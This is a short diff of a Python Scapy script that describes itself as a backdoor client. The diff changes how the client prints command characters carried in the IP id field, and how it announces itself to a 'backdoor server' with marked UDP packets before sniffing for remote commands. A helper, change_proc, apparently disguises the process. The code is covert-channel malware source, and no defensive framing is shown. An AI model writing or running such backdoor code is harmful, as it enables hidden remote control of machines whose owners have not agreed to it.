@@ -38,7 +38,7 @@ def change_proc():
 
 
 def recv_packet(pkt):
-	print pkt[IP].id 
+	print str(unichr(pkt[IP].id))
 
 
 def main():
@@ -47,7 +47,7 @@ def main():
 	change_proc()
 	
 	# 1. send initial packet that backdoor client program is run to server
-	send(IP(dst=serv_addr, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start')
+	send(IP(dst=serv_addr, tos=ord('B'), id=ord('K'))/fuzz(UDP(dport=80, sport=123))/'start', loop=0)
 	
 	# 2. wait for command from backdoor server (sniffing)
 	while True:
